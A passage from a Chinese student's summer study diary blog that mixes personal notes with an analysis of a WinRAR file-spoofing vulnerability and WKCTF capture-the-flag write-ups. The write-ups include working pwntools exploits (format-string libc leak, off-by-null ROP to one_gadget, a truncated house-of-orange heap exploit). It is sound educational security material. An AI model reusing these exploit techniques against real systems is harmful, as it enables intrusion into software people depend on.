operator">!</span>v5 <span class="token punctuation">)</span>  <span class="token function">_invoke_watson</span><span class="token punctuation">(</span>Expression<span class="token punctuation">,</span> FunctionName<span class="token punctuation">,</span> FileName<span class="token punctuation">,</span> LineNo<span class="token punctuation">,</span> Reserved<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">v5</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __cdecl <span class="token function">_invalid_parameter_noinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">_invalid_parameter</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>再往上追溯一个函数就是漏洞点sub_606910中的sub_5CE090(this[61], v14);，漏洞点就在wcscpy_s(Destination, 0x104u, Source);</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __thiscall <span class="token function">sub_606910</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token operator">*</span>this<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">if</span> <span class="token punctuation">(</span> v12 <span class="token operator">==</span> <span class="token number">116</span> <span class="token punctuation">)</span><span class="token keyword">goto</span> LABEL_25<span class="token punctuation">;</span><span class="token function">sub_44A540</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v12 <span class="token operator">-</span> <span class="token number">116</span> <span class="token operator">+</span> <span class="token number">144</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">LOBYTE</span><span class="token punctuation">(</span>v15<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token function">wcscpy_s</span><span class="token punctuation">(</span>Destination<span class="token punctuation">,</span> <span class="token number">0x104u</span><span class="token punctuation">,</span> Source<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sub_5CE090</span><span class="token punctuation">(</span>this<span class="token punctuation">[</span><span class="token number">61</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v14<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="7-12"><a href="#7-12" class="headerlink" title="#7.12"></a>#7.12</h2><p>早上改说明书摘要，下午和代理沟通，逆向一会和妈妈小姨去逛超市吃海底捞，回去又逆向了一会。唉海底捞真的快吃腻啦</p><h3 id="WinRAR逆向"><a href="#WinRAR逆向" class="headerlink" title="WinRAR逆向"></a>WinRAR逆向</h3><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://paper.seebug.org/3036/#/">https://paper.seebug.org/3036/#/</a></p><p><a href="https://www.cnblogs.com/GoodFish-/p/17715977.html#/">https://www.cnblogs.com/GoodFish-/p/17715977.html#/</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458544969&amp;idx=1&amp;sn=473822d99738dc8c20cf0c7df866adea&amp;chksm=b18d5bc386fad2d597b3b73e9bbd6d243e83e0191527db7cf84f277ac8c455b590956d5da778&amp;scene=27#/">https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458544969&amp;idx=1&amp;sn=473822d99738dc8c20cf0c7df866adea&amp;chksm=b18d5bc386fad2d597b3b73e9bbd6d243e83e0191527db7cf84f277ac8c455b590956d5da778&amp;scene=27#/</a></p><h4 id="实现效果"><a href="#实现效果" class="headerlink" title="实现效果"></a>实现效果</h4><p><code>poc.zip</code>中包含<code>poc.txt</code>和同名的<code>poc.txt</code>文件夹，文件夹中包含一个cmd执行程序名为<code>poc.txt .cmd</code>，用<code>winrar</code>打开<code>poc.zip</code>中的<code>poc.txt</code>文本，<code>poc.txt</code>和<code>poc.txt .cmd</code>都会被释放到临时文件中，而最终打开的是<code>poc.txt .cmd</code>，临时文件目录：<code>C:\Users\Lenovo\AppData\Local\Temp\Rar$DIa30724.35820</code></p><img src="/2024/07/05/2024-shu-qi-xue-xi-ji-lu/%E6%94%BB%E5%87%BB%E6%95%88%E6%9E%9C.png" class><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>用<code>010editor</code>打开<code>poc.zip</code>，需要关注<code>zip</code>结构体中的<code>deFileName</code>，在<code>zip</code>压缩包内，每个文件和文件夹都对应了一个<code>ZIPDIRENTRY</code>数据结构，该数据结构包含一个名为<code>deFileName</code>的成员，用于存储目标文件&#x2F;文件夹的名称</p><img src="/2024/07/05/2024-shu-qi-xue-xi-ji-lu/zip%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.png" class><p>用<code>bindiff</code>比较存在漏洞的版本和更新的版本之间的差异，确定漏洞点位置在<code>sub_1400EF508</code></p><img src="/2024/07/05/2024-shu-qi-xue-xi-ji-lu/bindiff%E7%BB%93%E6%9E%9C.png" class><h2 id="7-13"><a href="#7-13" class="headerlink" title="#7.13"></a>#7.13</h2><p>今天主要做了一些杂事，写了队规做了宣传海报清理手机电脑内存准备去招新咯。晚上收拾了下行李箱准备明天去上海投奔表哥（</p><p>看看我做的海报吧~非专业，凑合看咯</p><img src="/2024/07/05/2024-shu-qi-xue-xi-ji-lu/%E6%B5%B7%E6%8A%A5.jpg" class><h2 id="7-14"><a href="#7-14" class="headerlink" title="#7.14"></a>#7.14</h2><p>早上赶火车，晕的不行车上没看题。中午和哥哥去吃了早茶，嗯没错在上海吃早茶，上次从广州回来就对早茶念念不忘嘿嘿。下午打了几个小时<code>WKCTF</code>，晚上开周会。唉，好菜，<code>pwn</code>就写出来一题剩下的都是学长写的。什么时候能有学长和男朋友那么强啊（抓狂</p><h3 id="baby-stack"><a href="#baby-stack" class="headerlink" title="baby_stack"></a>baby_stack</h3><p><code>wait</code>中存在格式化字符串漏洞，随便测一下发现输入<code>6</code>的时候会输出一个<code>libc</code>上的地址从而得到基址，通过<code>libc</code>基址获取<code>one gadget</code>地址</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> num<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+Bh] [rbp-85h] BYREF</span>  <span class="token keyword">char</span> format<span class="token punctuation">[</span><span class="token number">120</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-80h] BYREF</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Press enter to continue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">getc</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Pick a number: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  num <span class="token operator">=</span> <span class="token function">strtol</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">snprintf</span><span class="token punctuation">(</span>format<span class="token punctuation">,</span> <span class="token number">0x64uLL</span><span class="token punctuation">,</span> <span class="token string">"Your magic number is: %%%d$llx\n"</span><span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span>format<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>echo_inner</code>中存在栈上的<code>off-by-null</code>，在栈上布置<code>rop</code>并且通过输入长度控制将<code>\x00</code>写到<code>rbp</code>，返回到上层函数之后就会抬栈运行到布置的<code>rop</code>，为了确保执行到<code>ogg</code>需要将最后<code>8</code>位覆盖成<code>ogg</code>，前面全部覆盖成<code>ret</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">echo_inner</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span>a1<span class="token punctuation">,</span> <span class="token keyword">int</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  a1<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">fread</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">,</span> size<span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You said:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'110.40.35.73'</span><span class="token punctuation">,</span> <span class="token number">33688</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'continue'</span><span class="token punctuation">,</span> <span class="token string">b'\n'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'number'</span><span class="token punctuation">,</span> <span class="token string">b'6'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'is: '</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3ec7e3</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.27/libc-2.27.so'</span><span class="token punctuation">)</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f2a5</span><span class="token punctuation">,</span> <span class="token number">0x4f302</span><span class="token punctuation">,</span> <span class="token number">0x10a2fc</span><span class="token punctuation">]</span>ogg <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseret <span class="token operator">=</span> <span class="token number">0x00000000000008aa</span> <span class="token operator">+</span> libc_baser<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'256)? '</span><span class="token punctuation">,</span> <span class="token string">b'256'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">31</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><p><a href="https://github.com/htr-tech/0xTwin/blob/master/twin_cipher.py">https://github.com/htr-tech/0xTwin/blob/master/twin_cipher.py</a></p><p>解码得到<code>base64</code>编码的图片，图片是一个二维码但是扫不出来，找在线工具<a href="https://cli.im/deqr/other%E5%BE%97%E5%88%B0%EF%BC%9A**%E8%AF%B7%E5%8F%91%E9%80%81">https://cli.im/deqr/other得到：**请发送</a> WKCTF2024 到微信公众号隐雾安全获取flag！**</p><p>照做得到<code>flagWKCTF&#123;hello_2024&#125;</code></p><h3 id="how-to-encrypt"><a href="#how-to-encrypt" class="headerlink" title="how_to_encrypt"></a>how_to_encrypt</h3><p>问了下<code>gpt</code>得知<code>encrypt</code>的运行结果是<code>ciphertext.txt</code>，其中会用到<code>flag</code>和<code>model.pth</code>，直接扔给<code>gpt</code>，通过<code>flag</code>和<code>model.pth</code>求<code>flag</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> torch<span class="token keyword">import</span> torch<span class="token punctuation">.</span>nn <span class="token keyword">as</span> nn<span class="token comment"># 读取 ciphertext.txt 中的内容并转换为张量</span><span class="token keyword">def</span> <span class="token function">read_ciphertext</span><span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        lines <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> line <span class="token keyword">in</span> lines<span class="token punctuation">:</span>        data<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">float</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> torch<span class="token punctuation">.</span>tensor<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token comment"># 定义网络结构</span><span class="token keyword">class</span> <span class="token class-name">Net</span><span class="token punctuation">(</span>nn<span class="token punctuation">.</span>Module<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">super</span><span class="token punctuation">(</span>Net<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>linear <span class="token operator">=</span> nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span>n<span class="token punctuation">,</span> n <span class="token operator">*</span> n<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>conv <span class="token operator">=</span> nn<span class="token punctuation">.</span>Conv2d<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> stride<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> padding<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">forward</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">:</span>        x <span class="token operator">=</span> self<span class="token punctuation">.</span>linear<span class="token punctuation">(</span>x<span class="token punctuation">)</span>        x <span class="token operator">=</span> x<span class="token punctuation">.</span>view<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> n<span class="token punctuation">,</span> n<span class="token punctuation">)</span>        x <span class="token operator">=</span> self<span class="token punctuation">.</span>conv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>        <span class="token keyword">return</span> x<span class="token comment"># 加载 ciphertext.txt 和 model.pth</span>ciphertext <span class="token operator">=</span> read_ciphertext<span class="token punctuation">(</span><span class="token string">'ciphertext.txt'</span><span class="token punctuation">)</span>n <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 假设最后一维是 n</span>ciphertext <span class="token operator">=</span> ciphertext<span class="token punctuation">.</span>view<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> n<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token comment"># 确保n与保存的模型一致</span>n <span class="token operator">=</span> <span class="token number">47</span>  <span class="token comment"># 根据错误信息设置为47</span><span class="token comment"># 初始化网络</span>mynet <span class="token operator">=</span> Net<span class="token punctuation">(</span>n<span class="token punctuation">)</span>mynet<span class="token punctuation">.</span>load_state_dict<span class="token punctuation">(</span>torch<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token string">'model.pth'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 定义一个可优化的输入变量</span>flag_tensor <span class="token operator">=</span> torch<span class="token punctuation">.</span>randn<span class="token punctuation">(</span>n<span class="token punctuation">,</span> requires_grad<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> dtype<span class="token operator">=</span>torch<span class="token punctuation">.</span>float32<span class="token punctuation">)</span><span class="token comment"># 优化器</span>optimizer <span class="token operator">=</span> torch<span class="token punctuation">.</span>optim<span class="token punctuation">.</span>Adam<span class="token punctuation">(</span><span class="token punctuation">[</span>flag_tensor<span class="token punctuation">]</span><span class="token punctuation">,</span> lr<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token comment"># 目标输出</span>target_output <span class="token operator">=</span> ciphertext<span class="token comment"># 迭代优化输入</span><span class="token keyword">for</span> epoch <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    optimizer<span class="token punctuation">.</span>zero_grad<span class="token punctuation">(</span><span class="token punctuation">)</span>    output <span class="token operator">=</span> mynet<span class="token punctuation">(</span>flag_tensor<span class="token punctuation">)</span>    loss <span class="token operator">=</span> nn<span class="token punctuation">.</span>MSELoss<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span>output<span class="token punctuation">,</span> target_output<span class="token punctuation">)</span>    loss<span class="token punctuation">.</span>backward<span class="token punctuation">(</span><span class="token punctuation">)</span>    optimizer<span class="token punctuation">.</span>step<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> epoch <span class="token operator">%</span> <span class="token number">1000</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'Epoch </span><span class="token interpolation"><span class="token punctuation">&#123;</span>epoch<span class="token punctuation">&#125;</span></span><span class="token string">, Loss: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>loss<span class="token punctuation">.</span>item<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token comment"># 获取优化后的输入</span>optimized_flag <span class="token operator">=</span> flag_tensor<span class="token punctuation">.</span>detach<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>numpy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 将优化后的输入转换回字符</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">round</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> optimized_flag<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Recovered flag:"</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="7-15"><a href="#7-15" class="headerlink" title="#7.15"></a>#7.15</h2><p>早上起的很早去医院抽血化验，唉可惜结果比上次还差。去医院附近一家有点名气的汤包店吃了蟹黄汤包，确实好吃！！！（不过咸蛋黄味的汤包不好吃，避雷）。从医院回去用了一个小时，嗯公交车坐反了…问题不大，回去之后过了一会吃了午饭睡到下午三四点，然后跟哥哥嫂子去南京路吃了蟹黄面，又去外滩玩到十点。蟹黄面好好吃呜呜，上次还是和男朋友一起吃的嘻嘻。回去以后洗漱完也很晚啦，就，晚安~</p><h2 id="7-16"><a href="#7-16" class="headerlink" title="#7.16"></a>#7.16</h2><p>复现了一下WKCTF的两道pwn，也是终于会一种异构了捏</p><h3 id="easy-heap"><a href="#easy-heap" class="headerlink" title="easy_heap"></a>easy_heap</h3><p>漏洞点出在<code>edit</code>可以堆溢出</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">edit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> index<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-10h] BYREF</span>  _DWORD size<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-Ch] BYREF</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>size<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  size<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Size :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> size<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0x1000u</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"too large"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Content :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> chunk_ptr<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">,</span> size<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>size<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没有<code>delete</code>且限制了<code>show</code>的长度为一个地址，首先想到的就是<code>house of orange</code></p><p>伪造<code>top chunk</code>的条件：</p><ul><li>保证原本<code>old top chunk</code>的<code>size</code>大于<code>MINSIZE</code></li><li>保证原本<code>old top chunk</code>的<code>prev_inuse</code>位是<code>1</code></li><li>原本<code>old top chunk</code>的地址加上其<code>size</code>之后的地址要与页对齐 也就是<code>address &amp; 0xfff = 0x000</code></li><li><code>old chunk</code>的<code>size</code>要小于申请的堆块大小加上<code>MINSIZE</code></li></ul><p>当申请的堆大小大于伪造的<code>top chunk</code>大小时会将<code>top chunk</code>释放，释放的大小为<code>top chunk size - 0x20</code>，并且根据释放的大小判断进入<code>fastbin</code>或者<code>unsorted bin</code></p><p>所以本题可以先释放一次<code>top chunk</code>到<code>unsorted bin</code>泄露<code>libc</code>，再释放一次<code>top chunk</code>到<code>fastbin</code>进行<code>fastbin attack</code></p><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token 